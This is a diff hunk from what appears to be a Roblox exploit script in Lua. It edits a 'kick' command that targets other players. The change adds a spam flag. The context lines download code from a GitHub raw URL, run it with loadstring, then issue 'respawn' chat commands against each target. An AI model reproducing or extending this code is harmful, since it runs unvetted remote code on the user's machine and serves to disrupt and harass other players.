@@ -986,6 +986,7 @@ addcommand("kick",
 "Kick a player",
 function()
     for _Index, Target in pairs(GetPlayer(args[2])) do
+        spam = true
         loadstring(game:HttpGet(('https://raw.githubusercontent.com/Tech-187/Temp/main/pm%20stuff'),true))()
         chatt("respawn "..Target.Name)
         task.wait(0.005)
